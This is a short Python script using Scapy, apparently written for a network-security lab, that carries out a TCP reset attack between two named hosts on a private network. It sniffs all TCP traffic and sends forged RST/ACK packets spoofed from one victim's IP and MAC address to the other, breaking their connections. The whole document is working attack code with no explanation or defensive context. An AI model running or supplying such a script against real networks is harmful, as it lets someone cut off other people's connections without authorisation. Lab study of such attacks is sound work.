from scapy.all import *

victim1 = "10.0.2.6"
victim1_mac = "08:00:27:8a:a1:b6"
victim2 = "10.0.2.7"
victim2_mac = "08:00:27:6a:a9:24"
def rst_atk(pkt):
	ether = Ether(src=victim2_mac,dst=victim1_mac)
	ip = IP(src=victim2,dst=victim1)
	tcp = TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="RA",seq=pkt[TCP].seq,ack=pkt[TCP].ack)
	ip.chksum = None
	tcp.chksum = None
	npkt = ether/ip/tcp
#	pkt[TCP].flags="RA"
	sendp(npkt)
	
	
pkt = sniff(filter="tcp",prn=rst_atk)
